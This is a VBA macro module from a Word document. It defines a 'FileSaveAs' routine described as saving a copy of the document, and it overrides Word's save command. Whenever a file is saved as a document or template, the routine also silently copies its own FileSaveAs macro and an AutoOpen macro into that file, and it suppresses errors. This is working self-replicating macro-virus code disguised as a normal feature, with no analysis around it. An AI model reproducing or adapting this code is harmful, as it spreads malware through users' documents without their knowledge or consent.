   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   On Error Resume Next
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If (dlg.Format = 0) Or (dlg.Format = 1) Then
       WordBasic.MacroCopy "FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs"
       WordBasic.MacroCopy "AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen"
   End If
   WordBasic.FileSaveAs dlg
   End Sub
